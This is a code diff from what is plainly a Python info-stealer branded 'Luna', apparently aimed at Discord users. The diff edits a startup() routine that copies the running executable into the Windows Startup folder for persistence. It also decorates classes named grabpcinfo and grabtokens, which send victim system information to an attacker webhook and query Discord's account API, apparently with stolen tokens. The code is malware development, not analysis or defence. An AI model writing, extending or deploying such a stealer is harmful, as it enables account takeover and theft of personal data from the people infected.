@@ -85,11 +85,14 @@ def fakeerror():
 
 def startup():
     startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-    try:
+    if os.path.exists(startup_path + argv[0]) and argv[0].endswith(".exe"):
+        os.remove(startup_path + argv[0])
         copy2(argv[0], startup_path)
-    except Exception:
-        pass
+    else:
+        if argv[0].endswith(".exe"):
+            copy2(argv[0], startup_path)
 
+@try_extract
 class grabpcinfo():
     def __init__(self) -> None:
         self.get_inf(__WEBHOOK__)
@@ -109,6 +112,7 @@ class grabpcinfo():
 
         webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
+@try_extract
 class grabtokens():
     def __init__(self) -> None:
         self.baseurl = "https://discord.com/api/v9/users/@me"
